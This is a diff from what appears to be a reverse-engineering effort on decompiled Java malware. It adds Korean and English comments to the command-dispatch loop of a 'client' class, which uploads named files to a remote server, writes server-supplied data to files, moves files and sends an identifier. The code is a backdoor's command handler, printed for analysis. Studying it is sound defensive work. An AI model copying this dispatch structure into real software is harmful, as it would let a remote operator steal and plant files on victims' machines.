@@ -117,8 +117,10 @@ public class client {
                                      */
                                     (new a(var21[1])).start();
                                 } else if (var21[0].equals(k.p)) {  // @0003
+                                    // var21[1]을 삭제하고, var21[2]를 포함한 어떤 메시지를 k.k Socket을 통해서 서버로 보낸다.
+                                    // TODO Analyze more
                                     (new b(var21[1], var21[2])).start();
-                                } else if (var21[0].equals(k.q)) {
+                                } else if (var21[0].equals(k.q)) {  // @0004
                                     // mv var21[1] to var21[2], don't care wheater this is file or dir
                                     /*
                                      * ex in linux) mv "var21[1]" "var21[2]"
@@ -127,17 +129,23 @@ public class client {
                                      * 2: var21[2] is already existing
                                      */
                                     (new h(var21[1], var21[2])).start();
-                                } else if (var21[0].equals(k.r)) {
+                                } else if (var21[0].equals(k.r)) {  // @0005
+                                    // var21[1~3]을 인자로 d.a를 call한다.
+                                    // var21[2]와 var21[3]이 포함된 문자열을 서버에 전송한 후
+                                    // var21[1]이라는 파일의 내용을 서버에 전송한다.
                                     (new d(k.b, k.c, var21[1], var21[2], var21[3], "0")).start();
-                                } else if (var21[0].equals(k.s)) {
+                                } else if (var21[0].equals(k.s)) {  // @0006
+                                    // var21[1~3]을 인자로 d.b를 call한다.
+                                    // var21[2]와 var21[3]이 포함된 문자열을 서버에 전송한 후
+                                    // 서버로부터 무언가를 받아서 var21[1]이라는 파일에 기록한다.
                                     (new d(k.b, k.c, var21[1], var21[2], var21[3], "1")).start();
-                                } else if (var21[0].equals(k.t)) {
+                                } else if (var21[0].equals(k.t)) {  // @0007
                                     // send random UID to server
                                     // "(random UID) + $#@ + @0001 + $#@ + &&&"
                                     (new g()).start();
-                                } else if (var21[0].equals(k.u)) {
+                                } else if (var21[0].equals(k.u)) {  // @0008
                                     (new j(k.b, k.c)).start();
-                                } else if (var21[0].equals(k.v)) {
+                                } else if (var21[0].equals(k.v)) {  // @0009
                                     (new i(var21[1])).start();
                                 }
                             } catch (Exception var10) {
